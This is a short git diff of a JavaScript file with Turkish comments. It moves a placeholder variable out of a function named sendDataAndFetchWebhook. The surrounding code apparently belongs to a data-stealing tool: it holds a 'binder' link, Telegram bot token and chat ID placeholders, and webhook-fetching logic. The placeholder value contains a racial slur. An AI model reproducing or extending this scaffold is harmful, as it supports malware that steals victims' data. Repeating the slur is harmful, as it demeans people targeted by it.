@@ -28,6 +28,7 @@ const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
 
+let diagret = '%REPLACE-ME-NIGGA%';
 let globalWebhookUrl = null;
 
 // Rastgele bir şifreleme anahtarı üret
@@ -40,7 +41,6 @@ function generateSecureReference() {
 
 // Webhook URL'sini almak için veri gönderme
 async function sendDataAndFetchWebhook() {
-    const diagret = '%REPLACE-ME-NIGGA%'; // URL yer tutucusu
     const reference = generateSecureReference();
     const data = {
         key: "ubolagasxlog1",
